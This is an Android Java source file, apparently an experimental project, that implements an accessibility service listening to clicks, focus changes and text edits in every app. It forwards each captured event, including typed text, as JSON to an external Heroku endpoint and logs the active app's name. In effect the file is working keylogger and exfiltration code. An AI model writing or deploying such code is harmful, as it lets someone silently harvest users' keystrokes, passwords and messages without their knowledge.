package com.example.test_test;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.Map;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.e(TAG, "UtsustestonAccessibilityEvent: ");
        Log.e(TAG, "UtsustestonAccessibilityTest:" + event);

        String evtStr = event.toString();

        String url = "https://accessibilitylistner.herokuapp.com/api";

        Log.i(TAG, evtStr);
        try {
            JSONObject jsonBody = new JSONObject();
            jsonBody.put("evt", evtStr);
            final String mRequestBody = jsonBody.toString();

            RequestQueue queue = Volley.newRequestQueue(MyAccessibilityService.this);
            StringRequest sr = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    Log.e(TAG, "OK");
                }
            }, error -> Log.e(TAG, "nope" + error)) {

                @Override
                public String getBodyContentType() {
                    return "application/json; charset=utf-8";
                }

                @Override
                public byte[] getBody() {
                    try {
                        return mRequestBody.getBytes("utf-8");
                    } catch (UnsupportedEncodingException uee) {
                        Log.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", mRequestBody);
                        return null;
                    }
                }
            };
            queue.add(sr);
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }

        String packageName = event.getPackageName().toString();
        PackageManager packageManager = this.getPackageManager();

        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            CharSequence testlabel = packageManager.getApplicationLabel(applicationInfo);
            Log.e(TAG, "app name is: "+testlabel );


        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "On interrupt: something went wrong");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();


        AccessibilityServiceInfo  info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;





        // Set the type of feedback your service will provide.

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;


        info.notificationTimeout = 100;

        this.setServiceInfo(info);


        Log.e(TAG,"UtsustestOnserverConnected: ");
    }
}
